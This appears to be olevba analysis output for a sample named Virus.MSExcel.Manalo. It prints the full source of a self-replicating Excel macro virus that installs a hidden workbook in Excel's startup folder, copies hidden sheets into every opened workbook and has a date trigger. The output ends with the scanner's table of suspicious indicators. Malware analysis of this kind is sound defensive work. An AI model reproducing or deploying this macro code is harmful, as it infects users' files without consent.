olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DNA.bas 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/DNA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

































Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
        Application.OnSheetActivate = "User"

End Sub

Sub User()
Attribute User.VB_ProcData.VB_Invoke_Func = " \n14"

        
Startup$ = Application.StartupPath
File$ = Dir(Startup$ & "\" & "MANALO.XLS")

If File$ <> "MANALO.XLS" Then GoTo FileDoesNotExist Else GoTo InfectOpenFile

FileDoesNotExist:
            
   Infected$ = ActiveWorkbook.Name
   
   Application.ScreenUpdating = False

   Set newBook = Workbooks.Add
    With newBook
        .Title = ""
        .Subject = ""
    End With
   
   NewWorkbook$ = ActiveWorkbook.Name
   Sheet$ = Workbooks(NewWorkbook$).Sheets(1).Name
        
   If Sheet$ <> "DNA" _
      Then
        Workbooks(Infected$).Sheets("Manalo").Copy Before:=Workbooks(NewWorkbook$).Sheets(1)
        Workbooks(Infected$).Sheets("DNA").Copy Before:=Workbooks(NewWorkbook$).Sheets(1)
        Workbooks(NewWorkbook$).Sheets("DNA").Visible = False
        Workbooks(NewWorkbook$).Sheets("Manalo").Visible = False
      Else
   End If
   ActiveWindow.Visible = False
      
   Workbooks(NewWorkbook$).SaveAs FileName:=Application.StartupPath & "/" & "MANALO.XLS"

GoTo Finish

InfectOpenFile:
        
   FileName$ = ActiveWorkbook.Name
   FirstSheet$ = Workbooks(FileName$).Sheets(1).Name
        
   Application.ScreenUpdating = False
   
   If FirstSheet$ <> "DNA" _
      Then
        Workbooks("MANALO.XLS").Sheets("DNA").Copy Before:=Workbooks(FileName$).Sheets(1)
        Workbooks("MANALO.XLS").Sheets("Manalo").Copy After:=Workbooks(FileName$).Sheets("DNA")
        Workbooks(FileName$).Sheets("Manalo").Name = "INC"
        Workbooks("MANALO.XLS").Sheets("Manalo").Copy Before:=Workbooks(FileName$).Sheets("INC")
        Workbooks(FileName$).Sheets("DNA").Visible = False
        Workbooks(FileName$).Sheets("Manalo").Visible = False
        Workbooks(FileName$).Sheets("INC").Visible = False
      Else
   End If
Today = Format(Date, "yy mm dd")
If Today >= "99 10 03" Then
Workbooks(FileName$).Sheets("INC").Visible = True
Workbooks(FileName$).Sheets("INC").Select
End If

Finish:

Application.OnSheetActivate = ""
Application.ScreenUpdating = True
Application.OnSheetActivate = "MANALO.XLS!User"
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1111.cls 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11111.cls 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï1.cls 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï2.cls 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï3.cls 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï4.cls 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï5.cls 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï6.cls 
in file: Virus.MSExcel.Manalo-9d1c23a444e88824fbaa8511b627a58f9c37948b - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  DN
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  IN
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  Manal
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  moti 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  moti 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  moti 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

